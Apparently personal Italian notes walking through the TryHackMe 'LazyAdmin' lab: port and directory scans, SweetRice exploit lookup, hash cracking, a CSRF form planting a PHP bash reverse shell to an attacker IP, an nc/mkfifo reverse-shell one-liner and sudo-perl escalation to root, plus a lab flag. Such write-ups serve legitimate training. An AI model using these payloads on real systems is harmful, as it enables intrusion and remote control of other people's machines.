
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/lazyadmin

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.174.4 -oG risultatoscan
```

```
sudo nmap -sC -sV -p 22,80 10.10.174.4 -oN risultatoscan2
```

```
gobuster dir -u http://10.10.174.4:80 -w /usr/share/wordlists/dirb/common.txt -t50
```

```
http://10.10.174.4/content/
```

```
gobuster dir -u http://10.10.174.4/content/ -w /usr/share/wordlists/dirb/common.txt -t50
```

```
http://10.10.174.4/content/_themes/
http://10.10.174.4/content/as/
http://10.10.174.4/content/attachment/
http://10.10.174.4/content/images/
http://10.10.174.4/content/inc/
/index.php            (Status: 200)
/js                   (Status: 301) 
http://10.10.174.4/content/js/

```

```
searchsploit Sweetrice 
```

```
SweetRice 1.5.1 - Backup Disclosure  | php/webapps/40718.txt
```
per info su come sfruttare exploit
```
searchsploit -x php/webapps/40718.txt
```
	(q=exit)
```
http://10.10.174.4/content/inc/mysql_backup/
```
scarichiamo db
lo apriamo
```
cat Downloads/mysql_bakup_20191129023059-1.5.1.sql
```
troviamo una password hashata
```
42f749ade7f9e195bf475f37a44cafcb
```
vediamo che tipo di hash è con
```
hashid 42f749ade7f9e195bf475f37a44cafcb
```
oppure
https://crackstation.net/
```
Password123
```
e un utente
```
manager
```
usiamo ora che siamo admin l'altra vulnerabilità
```
searchsploit -x php/webapps/40700.html
```
cerca in https://www.exploit-db.com/

Nella sezione Ads aggiungiamo lo script adattato e lo chiamiamo hacked
facciamo done
```
<html>
<body onload="document.exploit.submit();">
<form action="http://http://10.10.174.4/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.21.9.220/1234 0>&1'");
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>
```

ci mettiamo in ascolto
```
nc -lvnp 1234
```
eseguiamo la reverse shell
```
http://10.10.174.4/content/inc/ads/
```
ottenuta!
otteniamo una shell migliore facendo
```
 python -c 'import pty; pty.spawn("/bin/bash")'
```

```
cd /home/itguy
```

```
cat user.txt
```
user flag!
```
THM{63e5bce9271952aad1113b6f1ac28a07}
```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
sudo -l
```
Con questa configurazione nel file sudoers, qualsiasi utente può eseguire il comando
```
cat /home/itguy/backup.pl
```
Il comando "sh" viene utilizzato per eseguire script di shell. "/etc/copy.sh" è il percorso dello script di shell che viene eseguito.
```
 cat /etc/copy.sh
```
sembra una reverse shell
```
cd
```

```
cd /etc
```

```
nano copy.sh
```
non posso utilizzare nano! procediamo con echo
```
cat copy.sh
```

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

lo modifico con IP attaccante

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.21.9.220 5554 >/tmp/f" > copy.sh
```

ci mettiamo in ascolto
```
nc -lvnp 5554
```

```
sudo /usr/bin/perl /home/itguy/backup.pl
```
e siamo root!
- -- -

==altro metodo!==

```
echo "/bin/bash" > copy.sh
```

```
cat copy.sh
```

```
sudo /usr/bin/perl /home/itguy/backup.pl
```
e siamo root!

```
cd /root
```

```
cat root.txt 
```

```
THM{xxxxxxxxxxxxxxxxxx}
```




